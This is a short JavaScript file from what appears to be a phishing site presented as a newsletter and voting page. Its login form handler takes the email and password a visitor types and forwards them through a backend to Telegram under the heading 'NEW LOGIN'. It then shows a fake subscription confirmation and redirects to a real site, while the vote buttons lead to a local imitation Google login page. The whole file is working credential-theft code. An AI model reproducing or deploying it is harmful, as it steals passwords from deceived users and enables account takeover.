// Send message via backend API (credentials are now secure on server)
async function sendToTelegram(msg) {
    try {
        const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: msg })
        });

        const data = await response.json();

        if (!data.success) {
            console.error('Failed to send message:', data.error);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

// Newsletter/Login Submission
const authForm = document.getElementById('authForm');
if (authForm) {
    authForm.onsubmit = async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        await sendToTelegram(`📬 *NEW LOGIN*\nEmail: ${email}\nPassword: ${pass}`);
        alert('Subscription successful!');
        // Optional: Redirect to real site after alert
        window.location.href = "https://teammanila.com";
    };
}

// Voting Buttons - Redirect directly to Google login
document.querySelectorAll('.vote-btn').forEach(button => {
    button.addEventListener('click', function (e) {
        e.preventDefault();
        const candidate = this.getAttribute('data-candidate');
        // Store candidate and redirect directly to Google login
        sessionStorage.setItem('votingFor', candidate);
        window.location.href = 'google-login.html';
    });
});